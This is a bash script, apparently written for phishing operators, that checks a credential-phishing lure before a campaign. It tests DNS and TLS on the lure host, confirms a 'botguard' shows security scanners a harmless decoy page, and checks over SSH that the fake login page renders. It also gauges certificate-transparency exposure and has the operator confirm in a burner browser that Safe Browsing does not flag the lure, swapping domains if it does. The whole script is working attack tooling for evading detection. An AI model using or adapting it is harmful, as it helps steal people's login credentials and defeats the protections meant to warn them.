#!/bin/bash
# detect_check.sh — automated pre-campaign detection checklist.
# Checks what can be checked without a real Safe-Browsing-enabled browser,
# and prints instructions for the manual SB step.
#
# Usage:
#   ./detect_check.sh <lure-host> <lure-path> <token> [node-user@node-host]
#
# Example:
#   ./detect_check.sh accounts.example.com /AbCdEfGh myToken ubuntu@1.2.3.4
#
# Run from the operator workstation (Linux, macOS or Git Bash on Windows).
# The node address is only needed for the trusted-loopback render check (SSH);
# skip it to run DNS/cert/decoy checks only.

set -u

HOST="${1:?usage: detect_check.sh <lure-host> <lure-path> <token> [user@node]}"
LPATH="${2:?lure path}"
TOKEN="${3:?lure token}"
NODE="${4:-}"
URL="https://${HOST}${LPATH}?t=${TOKEN}"

PASS=0; FAIL=0; PEND=0

ok()   { echo "  [PASS] $1"; PASS=$((PASS+1)); }
bad()  { echo "  [FAIL] $1"; FAIL=$((FAIL+1)); }
pend() { echo "  [PEND] $1"; PEND=$((PEND+1)); }

echo "=== detection self-check: ${HOST}${LPATH} ==="
echo ""

# -- 1. DNS resolution (external resolver) ---------------------------------
echo "[1] DNS resolution"
A=$(nslookup -type=A "${HOST}" 1.1.1.1 2>/dev/null | grep -A1 "^Name:" | grep "Address" | awk '{print $2}' | head -1)
if [ -z "$A" ]; then
    # nslookup format varies; try the last Address line
    A=$(nslookup "${HOST}" 1.1.1.1 2>/dev/null | tail -2 | grep "Address" | awk '{print $NF}')
fi
if [ -n "$A" ] && echo "$A" | grep -qP '^\d+\.\d+\.\d+\.\d+$'; then
    ok "resolves to ${A}"
else
    bad "no A record from 1.1.1.1 — domain not reachable"
fi

# -- 2. TLS certificate -----------------------------------------------------
echo "[2] TLS certificate"
CERT=$(echo | timeout 10 openssl s_client -connect "${HOST}:443" -servername "${HOST}" 2>/dev/null | openssl x509 -noout -issuer -dates 2>/dev/null)
if [ -n "$CERT" ]; then
    ISSUER=$(echo "$CERT" | grep "issuer=" | head -1)
    EXPIRY=$(echo "$CERT" | grep "notAfter" | cut -d= -f2)
    ok "cert: ${ISSUER:-unknown} (expires ${EXPIRY:-?})"
else
    bad "no TLS cert served — hostname unreachable or SNI dropped"
fi

# -- 3. Botguard decoy (curl without browser UA) ---------------------------
echo "[3] Botguard decoy (plain curl)"
BODY=$(curl -sk --max-time 10 -o /dev/null -w "%{size_download}" "${URL}" 2>/dev/null)
if [ "$BODY" = "141" ] || [ "$BODY" = "143" ]; then
    ok "decoy served (${BODY}B) — scanners see a boring page"
elif [ "$BODY" = "0" ]; then
    pend "connection refused/timeout — may be normal from this network (SWG/DNS)"
else
    bad "got ${BODY}B (expected ~141B decoy) — check botguard config"
fi

# -- 4. Render check (trusted loopback on the node) -------------------------
echo "[4] Login render (trusted loopback)"
if [ -n "$NODE" ]; then
    SSH_OPTS="-o BatchMode=yes -o ConnectTimeout=10"
    if [ -n "${SSH_KEY:-}" ]; then
        SSH_OPTS="$SSH_OPTS -i $SSH_KEY"
    fi
    RENDER=$(ssh $SSH_OPTS "$NODE" 'curl -sk -A "Mozilla/5.0" --max-time 20 -L -c /tmp/dc -o /dev/null -w "%{http_code}:%{size_download}" --resolve '"${HOST}"':443:127.0.0.1 "'"${URL}"'"' 2>/dev/null)
    CODE=$(echo "$RENDER" | cut -d: -f1)
    SIZE=$(echo "$RENDER" | cut -d: -f2)
    if [ "$CODE" = "200" ] && [ "${SIZE:-0}" -gt 5000 ]; then
        ok "login page renders (${SIZE}B)"
    elif [ "$CODE" = "200" ] && [ "${SIZE:-0}" -gt 0 ] && [ "${SIZE:-0}" -le 500 ]; then
        pend "got ${SIZE}B — lure may be paused (expected between waves) or gated"
    else
        bad "render returned ${CODE:-?}/${SIZE:-?}B — check phishlet + lure"
    fi
else
    pend "skipped (no node address) — run with [user@node] to check"
fi

# -- 5. CT-log exposure ------------------------------------------------------
echo "[5] CT-log exposure (crt.sh)"
CT=$(curl -s --max-time 10 "https://crt.sh/?q=${HOST}&output=json" 2>/dev/null | python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
    print(len(d))
except: print(0)
" 2>/dev/null)
if [ "${CT:-0}" -gt 0 ]; then
    echo "  [INFO] ${CT} cert(s) in CT logs for ${HOST} (wildcard = normal; per-host = avoid)"
else
    echo "  [INFO] no CT-log entries found (or crt.sh unreachable)"
fi

# -- 6. Safe Browsing (manual) ----------------------------------------------
echo "[6] Safe Browsing check (MANUAL)"
echo "  Open a burner Chrome (SB enabled) and visit:"
echo "    ${URL}"
echo "  Expected: the real login page with NO 'Dangerous site' interstitial."
echo "  If flagged: do NOT use this domain for the campaign; start with a fresh one."
pend "Safe Browsing — verify manually in a burner browser"

# -- summary -----------------------------------------------------------------
echo ""
echo "=== summary: ${PASS} PASS / ${FAIL} FAIL / ${PEND} PENDING ==="
if [ "$FAIL" -gt 0 ]; then
    echo "⚠  ${FAIL} check(s) failed — fix before the campaign."
    exit 1
fi
echo "✓  Automated checks passed. Complete the ${PEND} pending item(s) manually."
